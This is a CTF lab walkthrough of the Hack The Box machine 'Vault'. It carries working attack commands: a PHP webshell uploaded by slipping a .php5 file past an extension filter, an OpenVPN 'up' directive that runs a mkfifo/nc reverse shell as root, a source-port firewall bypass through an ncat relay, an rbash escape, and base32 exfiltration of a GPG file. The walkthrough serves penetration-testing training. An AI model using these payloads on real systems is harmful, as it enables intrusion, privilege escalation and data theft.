<p><strong>Box:</strong> Vault &nbsp;|&nbsp; <strong>OS:</strong> Linux (Ubuntu 16.04) &nbsp;|&nbsp; <strong>Difficulty:</strong> Medium
<strong>Theme:</strong> Network pivoting through nested VMs, firewall source-port bypass, GPG key separation.
<strong>Skills practiced:</strong> File-upload filter bypass, OpenVPN config RCE, SSH tunneling/relays, restricted-shell (rbash) escape, moving data across air-gapped-ish segments, GPG decryption.</p>
</blockquote>
<p>This guide assumes:</p>
<ul>
<li><strong>Attacker (Kali) IP:</strong> <code>10.10.16.84</code></li>
<li><strong>Target (Ubuntu host) IP:</strong> <code>10.129.6.41</code></li>
</ul>
<p>Replace these with your own values if your instance differs.</p>
<hr>



<h2 id="0-the-mental-model">0. The Mental Model</h2>
<p>Vault spans three nested KVM/QEMU virtual machines that must be traversed in sequence.</p>
<pre><code>[ Kali 10.10.16.84 ]
        │  (you can ONLY reach the front host)
        ▼
[ Ubuntu HOST  10.129.6.41 / virbr0 = 192.168.122.1 ]   ← web exploit lands here (www-data → dave)
        │   This host bridges a private network: 192.168.122.0/24
        ├──► [ DNS + Configurator  192.168.122.4 ]   ← OpenVPN RCE → root → user.txt
        ├──► [ Firewall            192.168.122.5 ]   ← gatekeeper to the 192.168.5.0/24 net
        └──► [ Vault VM            192.168.5.2:987 ] ← behind firewall, holds root.txt.gpg
</code></pre>
<p><strong>Pivoting rule:</strong> every time you land on a new machine, your <em>first question</em> is always <em>"What can this machine see that my previous machine could not?"</em> That's the entire game. You collect a foothold, look at its network interfaces and its files, and that tells you where the next door is.</p>
<hr>
<h2 id="step-1-recon">Step 1: Recon</h2>
<blockquote>
<p><strong>Goal:</strong> Find which ports/services are exposed on the only host we can reach.</p>
</blockquote>
<p><strong>Verify the target is alive:</strong></p>
<pre><code class="language-bash" data-language="bash">ping -c 2 10.129.6.41
</code></pre>
<p><strong>Why:</strong> Confirms routing works (you're connected to the HTB VPN) before you waste time scanning a dead host. A reply with <code>ttl=63</code> also hints it's a Linux box one hop away.</p>
<p><strong>Scan for services:</strong></p>
<pre><code class="language-bash" data-language="bash">nmap -sV -sC -p 22,80 -oN nmap/scripts 10.129.6.41
</code></pre>
<ul>
<li><code>-sV</code> = identify service versions</li>
<li><code>-sC</code> = run default safe scripts</li>
<li><code>-oN</code> = save output to a file (always keep notes!)</li>
</ul>
<blockquote>
<p>In a real engagement you'd run a <strong>full</strong> port sweep first (<code>nmap -p- --min-rate 10000</code>). For this box only 22 and 80 are open, so we target them directly.</p>
</blockquote>
<p><strong>Result:</strong></p>
<pre><code>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</code></pre>
<p> Two doors. SSH almost never gives an unauthenticated way in (we have no creds yet), so the web server is the obvious starting point. <em>Attack the surface that takes input from anonymous users.</em></p>
<hr>
<h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>
<blockquote>
<p><strong>Goal:</strong> Map the website. Hidden directories and files are where the real functionality hides.</p>
</blockquote>
<p>The home page just mentions a customer named <strong>"sparklays"</strong>. That word is a breadcrumb - vendor/customer names often map to directory names.</p>
<p><strong>Check the lead and brute-force directories:</strong></p>
<pre><code class="language-bash" data-language="bash"># The hint directory
curl -s -o /dev/null -w "%{http_code}\n" http://10.129.6.41/sparklays/

# Brute force (the original solve used gobuster):
gobuster dir -u http://10.129.6.41/sparklays/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
</code></pre>
<p><strong>What we find (drilling down recursively):</strong></p>
<pre><code>/sparklays/login.php
/sparklays/admin.php
/sparklays/design/design.html
/sparklays/design/changelogo.php   ← an UPLOAD form
/sparklays/design/uploads/         ← where uploads land
</code></pre>
<p><strong>Confirm the upload page exists:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s http://10.129.6.41/sparklays/design/changelogo.php
</code></pre>
<pre><code class="language-html" data-language="html">&lt;form enctype="multipart/form-data" action="" method="post"&gt;
    &lt;input id="file" type="file" name="file" /&gt;&lt;br /&gt;
    &lt;input type="submit" value="upload file" name="submit" /&gt;
&lt;/form&gt;
</code></pre>
<p>The upload form is relevant because files are stored beneath a PHP-enabled web path. The field names <code>file</code> and <code>submit</code> are required to reproduce the request.</p>
<hr>
<h2 id="step-3-file-upload-filter-bypass">Step 3: File Upload Filter Bypass</h2>
<blockquote>
<p><strong>Goal:</strong> Upload a PHP file that the server will run. The server filters extensions, so we must find one that (a) slips past the filter and (b) is still executed as PHP.</p>
</blockquote>
<p>If you upload <code>shell.php</code>, it's rejected. The server is filtering by <strong>extension</strong>. PHP has <em>several</em> extensions Apache may execute: <code>.php</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.phtml</code>, <code>.pht</code>. Filters often blacklist <code>.php</code> but forget the variants - or, as here, use a whitelist that happens to include <code>.php5</code>.</p>
<blockquote>
<p>The actual server-side check (revealed by reading <code>changelogo.php</code>) is:</p>
<pre><code class="language-php" data-language="php">if(!preg_match('/(gif|jpe?g|png|csv|php5)$/i', $file_name)) { reject } else { accept }
</code></pre>
<p>Note the developer accidentally <strong>whitelisted <code>php5</code></strong> as if it were an image type. That's our way in.</p>
</blockquote>
<p><strong>Create a minimal PHP webshell:</strong></p>
<pre><code class="language-bash" data-language="bash">echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; cmd.php5
</code></pre>
<ul>
<li><code>system()</code> runs a shell command and prints its output.</li>
<li><code>$_REQUEST["cmd"]</code> reads a parameter named <code>cmd</code> from the URL or POST body.</li>
</ul>
<p><strong>Upload it via curl (mimicking the form):</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -F "file=@cmd.php5" -F "submit=upload file" \
     http://10.129.6.41/sparklays/design/changelogo.php
</code></pre>
<ul>
<li><code>-F "file=@cmd.php5"</code> = multipart file upload, field name <code>file</code>, <code>@</code> means "read this local file".</li>
</ul>
<p><strong>Result:</strong> <code>The file was uploaded successfully</code> </p>
<p> Keep the payload <em>tiny and reliable</em>. A one-line <code>system($_REQUEST['cmd'])</code> shell works over GET or POST, is trivial to drive with <code>curl</code>, and is easy to clean up later. Don't reach for a giant feature-rich webshell when one line gets the job done.</p>
<hr>
<h2 id="step-4-confirm-rce">Step 4: Confirm RCE</h2>
<blockquote>
<p><strong>Goal:</strong> Prove the uploaded file actually executes commands.</p>
</blockquote>
<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.6.41/sparklays/design/uploads/cmd.php5?cmd=id"
</code></pre>
<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>We have command execution as <strong><code>www-data</code></strong> (the low-privileged web server user).</p>
<p> The very first command you run on a new shell is almost always <code>id</code> - <em>who am I, and what groups am I in?</em> It instantly tells you your privilege level and hints at lateral/privilege-escalation paths (e.g., membership in <code>docker</code>, <code>lxd</code>, <code>sudo</code>).</p>
<hr>
<h2 id="step-5-loot-credentials">Step 5: Loot Credentials</h2>
<blockquote>
<p><strong>Goal:</strong> Look for credentials and notes left lying around. CTF boxes (and real networks!) are full of these.</p>
</blockquote>
<p>We have RCE but only as <code>www-data</code>. We can read other users' world-readable files. Check home directories.</p>
<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.6.41/sparklays/design/uploads/cmd.php5?cmd=cat+/home/dave/Desktop/ssh+/home/dave/Desktop/key+/home/dave/Desktop/Servers"
</code></pre>
<pre><code>dave
Dav3therav3123          ← SSH password for dave
itscominghome           ← (mystery string - turns out to be a GPG passphrase)
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x           ← the goal; "x" = unknown IP for now
</code></pre>
<p>Three useful findings:</p>
<ol>
<li><strong><code>ssh</code></strong> → username <code>dave</code>, password <code>REDACTED</code>.</li>
<li><strong><code>key</code></strong> → <code>itscominghome</code>. We don't know what it unlocks yet - <em>note it and move on.</em></li>
<li><strong><code>Servers</code></strong> → a map of the internal network and the names of the next targets.</li>
</ol>
<p>Retain unexplained artifacts such as the <code>key</code> file because later stages may establish their purpose. The <code>Servers</code> file also provides the internal network map.</p>
<hr>
<h2 id="step-6-ssh-as-dave">Step 6: SSH as dave</h2>
<blockquote>
<p><strong>Goal:</strong> Upgrade from a clumsy webshell to a real interactive shell.</p>
</blockquote>
<pre><code class="language-bash" data-language="bash">ssh dave@10.129.6.41
# password: REDACTED
</code></pre>
<pre><code>dave@ubuntu:~$ id
uid=1001(dave) gid=1001(dave) groups=1001(dave)
</code></pre>
<p> A reverse/webshell is fragile (no job control, no tab completion, dies easily). The moment you find valid SSH creds, <em>get a proper TTY</em>. Comfortable footing makes the rest of the box dramatically easier - and you'll need stable shells for the tunneling ahead.</p>
<hr>
<h2 id="step-7-discover-the-internal-network">Step 7: Discover the Internal Network</h2>
<blockquote>
<p><strong>Goal:</strong> Find out what <em>this</em> host can see that Kali cannot.</p>
</blockquote>
<pre><code class="language-bash" data-language="bash">ifconfig virbr0
</code></pre>
<pre><code>virbr0  inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
</code></pre>
<p>The interface name <code>virbr0</code> ("virtual bridge 0") is a dead giveaway: <strong>this host runs libvirt/KVM virtual machines</strong>, and it's the gateway (<code>.1</code>) for the <code>192.168.122.0/24</code> network. From the Servers file we already know:</p>
<ul>
<li><code>192.168.122.4</code> = DNS + Configurator</li>
<li><code>192.168.122.5</code> = Firewall</li>
</ul>
<p><strong>Quick ping sweep to confirm live hosts:</strong></p>
<pre><code class="language-bash" data-language="bash">for i in $(seq 1 254); do (ping -c1 -W1 192.168.122.$i | grep "bytes from" &amp;); done
</code></pre>
<p> <em>Every new host = re-run recon from its perspective.</em> Kali can't route to <code>192.168.122.0/24</code>, but <code>dave@ubuntu</code> sits right on it. The discovery of <code>virbr0</code> is the "aha" that reframes the box from "one machine" to "a network of machines I must hop through." Interface names, routing tables (<code>route -n</code>), and <code>/etc/hosts</code> are your network maps.</p>
<hr>
<h2 id="step-8-enumerate-the-configurator">Step 8: Enumerate the Configurator</h2>
<blockquote>
<p><strong>Goal:</strong> Find the attack surface on <code>192.168.122.4</code>.</p>
</blockquote>
<p><code>curl</code> isn't installed on this host, so use <code>wget</code>:</p>
<pre><code class="language-bash" data-language="bash">wget -qO- http://192.168.122.4/
wget -qO- http://192.168.122.4/vpnconfig.php
</code></pre>
<p>The index links to <code>vpnconfig.php</code>, which serves a form:</p>
<pre><code class="language-html" data-language="html">&lt;form action="vpnconfig.php?function=testvpn" method="post"&gt;
  &lt;textarea name="text"&gt;&lt;/textarea&gt;
  &lt;input type="submit" value="Update file"&gt;
&lt;/form&gt;
&lt;a href="vpnconfig.php?function=testvpn"&gt;Test VPN&lt;/a&gt;
</code></pre>
<p>It lets you <strong>submit an OpenVPN config file</strong> (<code>text</code> parameter) and then <strong>execute it</strong> (<code>?function=testvpn</code>). The page even hints: <em>"nobind must be used."</em></p>
<p>Executing uploaded OpenVPN configurations creates a command-execution boundary because the configuration can contain shell directives.</p>
<hr>
<h2 id="step-9-openvpn-config-rce">Step 9: OpenVPN Config RCE</h2>
<blockquote>
<p><strong>Goal:</strong> Abuse the OpenVPN <code>up</code> directive to get a shell. OpenVPN runs the command in an <code>up</code> line <em>after the tunnel device initializes</em> - and here it runs as <strong>root</strong>.</p>
</blockquote>
<h3 id="the-trick">The trick</h3>
<p>OpenVPN config files support:</p>
<pre><code>script-security 2          # allow running external scripts
up "&lt;command&gt;"             # run &lt;command&gt; after the interface comes up
</code></pre>
<p>With a static point-to-point <code>ifconfig</code> line, the TUN device initializes immediately and fires the <code>up</code> command - no real VPN server needed.</p>
<h3 id="set-up-the-catcher-terminal-2">Set up the catcher (Terminal 2)</h3>
<p>The reverse shell must call back to a host the Configurator can reach. The Configurator (<code>192.168.122.4</code>) can reach the ubuntu host at <code>192.168.122.1</code> - <strong>but it cannot reach Kali</strong> (Kali is on the far side of the ubuntu host). So we listen <strong>on ubuntu</strong>, not on Kali.</p>
<p>Open a <strong>second SSH session</strong> to ubuntu and start a listener:</p>
<pre><code class="language-bash" data-language="bash">ssh dave@10.129.6.41          # password: REDACTED
nc -lvnp 8181
</code></pre>
<h3 id="fire-the-payload-terminal-1-on-ubuntu">Fire the payload (Terminal 1, on ubuntu)</h3>
<p>The malicious config, before URL-encoding:</p>
<pre><code>remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.122.1 8181 &gt;/tmp/f'"
nobind
</code></pre>
<p>The <code>up</code> line is a classic <strong>mkfifo reverse shell</strong> (works with OpenBSD netcat, which has no <code>-e</code> flag).</p>
<p>Deliver it via POST (URL-encoded, <code>%0A</code> = newline) and trigger execution:</p>
<pre><code class="language-bash" data-language="bash">wget -qO- --post-data='text=remote%20192.168.122.1%0Aifconfig%2010.200.0.2%2010.200.0.1%0Adev%20tun%0Ascript-security%202%0Aup%20%22%2Fbin%2Fbash%20-c%20%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.122.1%208181%20%3E%2Ftmp%2Ff%27%22%0Anobind' \
  'http://192.168.122.4/vpnconfig.php?function=testvpn'
</code></pre>
<h3 id="catch-root-terminal-2">Catch root (Terminal 2)</h3>
<pre><code>Connection from [192.168.122.4] port 8181 ...
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p> <strong>root on the DNS/Configurator VM.</strong></p>
<blockquote>
<p><strong>Note on the callback target:</strong> We aimed the reverse shell at <code>192.168.122.1:8181</code> (the ubuntu host) - <em>not</em> at Kali. This is a recurring theme: a deep host can only "phone home" to the segment it can actually route to. Know your network map or your shells silently fail.</p>
</blockquote>
<p> When you craft a reverse shell across pivots, the single most common mistake is pointing it at an IP the victim can't reach. Always answer: <em>"From where this command runs, what is the path back to a listener I control?"</em> Here that path is the ubuntu host's <code>192.168.122.1</code>.</p>
<hr>
<h2 id="step-10-loot-dns">Step 10: Loot DNS</h2>
<blockquote>
<p><strong>Goal:</strong> Grab the user flag and the credentials/IPs for the next hop.</p>
</blockquote>
<p>In the root@DNS shell:</p>
<pre><code class="language-bash" data-language="bash">cat /home/dave/user.txt
cat /home/dave/ssh
cat /etc/hosts
</code></pre>
<pre><code>a4947f[redacted]bd88c73     ← user.txt
dave
dav3gerous567                         ← new password (DNS + Vault)
...
192.168.5.2    Vault                  ← the Vault's real IP (was "x")!
</code></pre>
<p><code>/etc/hosts</code> reveals the Vault lives at <strong><code>192.168.5.2</code></strong> - a <em>different</em> subnet (<code>192.168.5.0/24</code>) we couldn't see from ubuntu. And from the Servers file, the <strong>Firewall (<code>192.168.122.5</code>)</strong> stands between us and that subnet.</p>
<p> <code>/etc/hosts</code>, <code>~/.ssh/known_hosts</code>, <code>.bash_history</code>, and log files are the richest sources of "what talks to what." The author placed the next target's IP exactly where a careful enumerator would look. <em>Read the boring config files - they hand you the map.</em></p>
<blockquote>
<p><strong>Bonus path-finding (optional):</strong> <code>grep -rHa "192.168.5.2" /var/log</code> on DNS reveals <code>auth.log</code> entries showing dave logging in <em>from</em> the Vault with <strong>source port 4444</strong>, plus root running:</p>
<pre><code>nmap 192.168.5.2 -Pn --source-port=4444 -f
ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
</code></pre>
<p>These log lines literally show you the firewall-bypass technique and the relay command. Logs are a walkthrough left behind by the previous user.</p>
</blockquote>
<hr>
<h2 id="step-11-understand-the-firewall">Step 11: Understand the Firewall</h2>
<blockquote>
<p><strong>Goal:</strong> Figure out why we can't reach Vault directly, and how to slip past.</p>
</blockquote>
<p>The routing table on DNS shows traffic to <code>192.168.5.0/24</code> is sent via the Firewall (<code>192.168.122.5</code>). A normal scan of Vault shows everything filtered:</p>
<pre><code class="language-bash" data-language="bash">ncat 192.168.5.2 987 -w 3 &lt;/dev/null        # times out / no banner
</code></pre>
<p>But the auth.log breadcrumbs hinted at <strong>source ports 53 and 4444</strong>. The Firewall is configured to only forward packets whose <em>source port</em> is 53 (DNS) or 4444. Test it:</p>
<pre><code class="language-bash" data-language="bash">ncat 192.168.5.2 987 -p 53 -w 3 &lt;/dev/null
</code></pre>
<pre><code>SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4     ← it answers!
</code></pre>
<ul>
<li><code>-p 53</code> forces our <strong>source</strong> port to 53, which the firewall whitelists.</li>
</ul>
<p>So <strong>Vault runs SSH on port 987</strong>, reachable only if our source port is 53 (or 4444).</p>
<p> Firewalls usually filter on <em>destination</em>, but some filter on <em>source port</em> (a legacy trick from when DNS/NTP used fixed source ports). When a port is "filtered" from one tool but the logs show it being used, ask <em>"what's different about the traffic that's allowed?"</em> The answer here was a non-obvious property: the <strong>source</strong> port, not the destination.</p>
<hr>
<h2 id="step-12-build-the-relay">Step 12: Build the Relay</h2>
<blockquote>
<p><strong>Goal:</strong> SSH normally doesn't let you set a source port. We need a middle-man that accepts our connection and re-emits it toward Vault <em>with source port 53</em>.</p>
</blockquote>
<p><code>ncat</code>'s <code>--sh-exec</code> lets one listener pipe its data into another command. We chain two ncats:</p>
<pre><code class="language-bash" data-language="bash"># On DNS (as root, because binding source port 53 requires privilege):
ncat -lk 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &gt;/tmp/relay.log 2&gt;&amp;1 &amp;
</code></pre>
<ul>
<li><code>-l 1234</code> = listen on port 1234 (any client can connect here)</li>
<li><code>-k</code> = keep listening for multiple connections</li>
<li><code>--sh-exec "ncat 192.168.5.2 987 -p 53"</code> = for each connection, fire a <em>new</em> ncat to Vault's SSH <strong>with source port 53</strong></li>
</ul>
<p>Verify it's listening:</p>
<pre><code class="language-bash" data-language="bash">netstat -lntp | grep 1234
# tcp 0 0 0.0.0.0:1234 ... LISTEN ... ncat
</code></pre>
<p>Now anything that connects to <strong>DNS:1234</strong> is transparently forwarded to <strong>Vault:987</strong> through the firewall.</p>
<p> When a protocol (SSH) can't natively do what you need (set a source port), insert a dumb relay that <em>can</em>. <code>ncat --sh-exec</code> is the duct tape of pivoting. Think in terms of <em>"plumbing"</em>: build pipes that carry your traffic to places it normally can't go. Bind privileged ports as root.</p>
<hr>
<h2 id="step-13-ssh-into-vault">Step 13: SSH into Vault</h2>
<blockquote>
<p><strong>Goal:</strong> Connect to Vault through the relay and escape its restricted shell.</p>
</blockquote>
<p>From the <strong>ubuntu</strong> host (which can reach DNS on <code>192.168.122.4:1234</code> directly - same subnet, no firewall involved):</p>
<pre><code class="language-bash" data-language="bash">ssh dave@192.168.122.4 -p 1234 -t bash
# password: REDACTED
</code></pre>
<ul>
<li><code>-p 1234</code> = connect to the relay (which forwards to Vault:987 with src port 53)</li>
<li><code>-t bash</code> = <strong>force a TTY and run <code>bash</code></strong> : this is the rbash escape</li>
</ul>
<pre><code>dave@vault:~$ id
uid=1001(dave) gid=1001(dave)
</code></pre>
<p>We're on <strong>Vault</strong>. By default Vault drops you into <strong><code>rbash</code></strong> (restricted bash - no <code>cd</code>, no <code>/</code> in commands, limited PATH). Requesting <code>bash</code> directly via <code>ssh -t bash</code> sidesteps rbash entirely because the restriction is only applied to the <em>login</em> shell, not to a command we explicitly ask SSH to run.</p>
<p> Restricted shells are speed bumps, not walls. Common escapes: <code>ssh user@host -t bash</code>, <code>vi</code> → <code>:!bash</code>, <code>python -c 'pty.spawn("/bin/bash")'</code>, or any allowed program with a shell-escape feature. Always test the <em>cheapest</em> escape first.</p>
<hr>
<h2 id="step-14-exfiltrate-the-flag">Step 14: Exfiltrate the Flag</h2>
<blockquote>
<p><strong>Goal:</strong> The flag is GPG-encrypted and the private key isn't here. We must move the encrypted file to where the key lives.</p>
</blockquote>
<pre><code class="language-bash" data-language="bash">ls -la
file root.txt.gpg
</code></pre>
<pre><code>root.txt.gpg: PGP RSA encrypted session key - keyid: ... RSA 4096b
</code></pre>
<p>Attempting to decrypt on Vault fails - <em>no secret key here</em>:</p>
<pre><code class="language-bash" data-language="bash">gpg -d root.txt.gpg
# gpg: decryption failed: secret key not available
</code></pre>
<p>Vault is missing common transfer tools (no <code>nc</code> chains set up for us, no <code>scp</code> convenience), <strong>but it has <code>base32</code></strong>. We encode the binary file into copy-pasteable ASCII:</p>
<pre><code class="language-bash" data-language="bash">base32 -w0 root.txt.gpg
# QUBAYA6HPDDB...long blob...RI7XY=
</code></pre>
<ul>
<li><code>-w0</code> = no line wrapping → one clean line to copy.</li>
</ul>
<p>Copy that blob.</p>
<p> Data exfiltration over a hostile/limited link is a "what do I have?" puzzle. No <code>scp</code>? No <code>nc</code>? Fine - <em>any</em> text encoder (<code>base64</code>, <code>base32</code>, <code>xxd</code>, <code>od</code>, even <code>openssl base64</code>) turns a binary into text you can paste through whatever channel you do have. Check what binaries exist (<code>ls /usr/bin</code>, <code>compgen -c</code>) and improvise.</p>
<hr>
<h2 id="step-15-decrypt-root-txt">Step 15: Decrypt root.txt</h2>
<blockquote>
<p><strong>Goal:</strong> Reunite the encrypted file with its private key. The key (<code>david &lt;dave@david.com&gt;</code>, ID <code>D1EB1F03</code>) lives in <strong>dave's keyring on the ubuntu host</strong>, and the passphrase is the mystery <code>key</code> file from Step 5: <code>itscominghome</code>.</p>
</blockquote>
<p>Open a clean shell on the <strong>ubuntu</strong> host (the key is <em>not</em> on DNS or Vault):</p>
<pre><code class="language-bash" data-language="bash">ssh dave@10.129.6.41          # password: REDACTED
gpg --list-secret-keys
# sec 4096R/0FDFBFE4 ... uid david &lt;dave@david.com&gt; ... ssb 4096R/D1EB1F03
</code></pre>
<p>Decode the pasted blob and decrypt:</p>
<pre><code class="language-bash" data-language="bash">echo 'QUBAYA6HPDDB...RI7XY=' | base32 -d &gt; /tmp/a.gpg
gpg -d /tmp/a.gpg
# Enter passphrase: itscominghome
</code></pre>
<pre><code>ca468[redacted]9bfe819     ← root.txt 
</code></pre>
<p> This is the box's signature lesson - <strong>the lock and the key are deliberately stored on different machines.</strong> The encrypted flag is on Vault; the private key is back on ubuntu; the passphrase was a random string you grabbed in Step 5 and held for six steps. Pulling it together rewards the player who <em>collected and remembered everything</em>. Encryption only protects data if the key isn't sitting next to it - and attackers win when developers/admins violate that rule.</p>

<h2 id="lessons-learned">Lessons learned</h2>
<ol>
<li><strong>Re-enumerate from every new vantage point.</strong> Each host sees a different slice of the network. Check <code>ip a</code> / <code>ifconfig</code>, <code>route -n</code>, <code>/etc/hosts</code>, and <code>arp -a</code> the moment you land.</li>
<li><strong>Retain unexplained artifacts.</strong> The <code>itscominghome</code> string became relevant only at the final stage.</li>
<li><strong>Logs are confessions.</strong> <code>/var/log/auth.log</code> literally showed the firewall-bypass source ports and the exact relay command the previous user ran.</li>
<li><strong>Reverse shells must reach a listener the victim can route to.</strong> Across pivots, point callbacks at the <em>adjacent</em> hop, not at Kali.</li>
<li><strong>Restricted shells and odd firewalls are speed bumps.</strong> <code>ssh -t bash</code> beats rbash; <code>-p 53</code> beats a source-port firewall; <code>base32</code> beats a missing <code>scp</code>.</li>
<li><strong>Features that "run" your input are RCE.</strong> The OpenVPN "Test VPN" button and the file-upload-then-serve flow are the same pattern: untrusted input reaching an executor.</li>
<li><strong>Keys and locks must live apart.</strong> The whole endgame exists because the GPG key wasn't stored with the encrypted file. Good security; great puzzle.</li>
</ol>
